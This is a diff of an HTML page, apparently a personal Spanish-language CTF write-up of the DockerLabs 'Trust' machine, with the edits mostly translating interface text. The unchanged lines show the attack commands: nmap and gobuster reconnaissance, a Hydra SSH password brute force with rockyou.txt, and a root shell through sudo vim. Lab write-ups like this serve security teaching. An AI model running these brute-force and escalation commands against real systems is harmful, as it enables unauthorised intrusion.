@@ -106,7 +106,7 @@
     .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
     .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
     .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
-    .badge-vfacil { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-muy-facil { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
     .badge-docker { color: var(--cyan);   border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
     .badge-linux  { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
     .badge-gobuster { color: var(--orange); border-color: rgba(255,140,0,0.4); background: rgba(255,140,0,0.05); }
@@ -142,7 +142,7 @@
     .val-red    { color: var(--red); }
     .val-vfacil { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -309,30 +309,32 @@
 
 <!-- NAV -->
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">dockerlabs</a> / <span>trust</span>
-    </p>
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
+      <span>trust</span>
+    </div>
     <h1 class="writeup-title"><span>Trust</span></h1>
-    <p class="writeup-subtitle">DockerLabs — Linux · Gobuster → Hydra SSH → sudo vim PrivEsc</p>
+    <p class="writeup-subtitle">DockerLabs — Linux · Gobuster → Hydra SSH → escalada con sudo vim</p>
     <div class="writeup-meta">
-      <span class="meta-badge badge-vfacil">MUY FÁCIL</span>
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
       <span class="meta-badge badge-docker">DOCKERLABS</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-gobuster">GOBUSTER</span>
       <span class="meta-badge badge-hydra">HYDRA</span>
       <span class="meta-badge badge-vim">VIM SUDO</span>
-      <span class="meta-date">// Abril 2026</span>
+      <span class="meta-date">📅 Abril 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -349,7 +351,7 @@
         <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
         <li><a href="#enumeracion-web">03 · Enumeración Web</a></li>
         <li><a href="#acceso-inicial">04 · Acceso Inicial</a></li>
-        <li><a href="#escalada">05 · Escalada de Privilegios</a></li>
+        <li><a href="#escalada">05 · Escalada de privilegios</a></li>
         <li><a href="#comandos">06 · Referencia de Comandos</a></li>
         <li><a href="#glosario">07 · Glosario</a></li>
       </ul>
@@ -451,7 +453,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh trust.tar">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DEPLOY</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">trust.tar</span></span></div>
       </div>
@@ -478,7 +480,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping 172.18.0.2 -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PING</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">172.18.0.2</span> <span class="flag">-c 3</span></span></div>
       </div>
@@ -511,7 +513,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.18.0.2 -oX trust.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap
           <span class="flag">-p-</span>
@@ -562,7 +564,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl trust.xml > trust.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLT</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">trust.xml</span> <span class="flag">&gt;</span> <span class="arg">trust.html</span></span></div>
       </div>
@@ -594,7 +596,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="gobuster dir -u 172.18.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x html,php,sh,py">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">GOBUSTER</span>
         <div><span class="prompt">$ </span><span class="cmd">gobuster dir
           <span class="flag">-u</span> <span class="arg">172.18.0.2</span>
@@ -682,7 +684,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="hydra -l mario -P /home/kali/Desktop/diccionarios/rockyou.txt -f ssh://172.18.0.2 -t 20 -V">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HYDRA</span>
         <div><span class="prompt">$ </span><span class="cmd">hydra
           <span class="flag">-l</span> <span class="arg">mario</span>
@@ -735,7 +737,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh mario@172.18.0.2">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">mario@172.18.0.2</span></span></div>
         <div><span class="comment"># Si da error de host key: ssh-keygen -R 172.18.0.2</span></div>
@@ -767,7 +769,7 @@
     <!-- 05 ESCALADA -->
     <div class="section" id="escalada">
       <p class="section-label">// 05</p>
-      <h2 class="section-title">Escalada de Privilegios</h2>
+      <h2 class="section-title">Escalada de privilegios</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -786,7 +788,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo -l">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SUDO</span>
         <div><span class="prompt">mario@1364d16e81a8:~$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
       </div>
@@ -801,7 +803,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SUID</span>
         <div><span class="prompt">mario@1364d16e81a8:~$ </span><span class="cmd">find <span class="arg">/</span> <span class="flag">-perm -4000</span> 2&gt;/dev/null</span></div>
       </div>
@@ -849,7 +851,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo vim -c ':!/bin/bash'">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC</span>
         <div><span class="prompt">mario@1364d16e81a8:~$ </span><span class="cmd">sudo vim <span class="flag">-c</span> <span class="arg">':!/bin/bash'</span></span></div>
       </div>
@@ -988,7 +990,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Ataque de Diccionario / Fuerza Bruta</div>
+          <div class="glos-term">Ataque de Diccionario / Fuerza bruta</div>
           <div class="glos-def">Un <strong>ataque de diccionario</strong> prueba contraseñas de una lista precompilada en lugar de todas las combinaciones posibles (fuerza bruta pura). <strong>rockyou.txt</strong> contiene 14.3 millones de contraseñas reales filtradas del breach de RockYou en 2009, y es el estándar en CTFs porque refleja contraseñas que personas reales usan: palabras comunes, nombres, secuencias numéricas. <strong>Hydra</strong> automatiza este proceso contra protocolos de red como SSH, FTP o HTTP. En esta máquina, la contraseña <em>chocolate</em> aparece en posición 27 del wordlist, lo que demuestra por qué las contraseñas simples son críticas en entornos reales.</div>
         </div>
 
@@ -998,7 +1000,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Post-Explotación y Escalada de Privilegios</div>
+          <div class="glos-term">Post-Explotación y Escalada de privilegios</div>
           <div class="glos-def">La <strong>post-explotación</strong> es la fase que comienza al obtener acceso inicial a un sistema. Incluye: enumeración del sistema (usuarios, grupos, procesos, red), búsqueda de credenciales almacenadas, y <strong>escalada de privilegios</strong> (pasar de usuario estándar a root/SYSTEM). Los vectores más comunes en Linux son: permisos sudo mal configurados, binarios SUID abusables, tareas cron ejecutadas como root, capabilities de Linux, servicios mal configurados y contraseñas reutilizadas. En CTFs, la post-explotación suele terminar al obtener acceso root y leer el archivo flag correspondiente.</div>
         </div>
 
@@ -1015,9 +1017,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Trust · DockerLabs</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
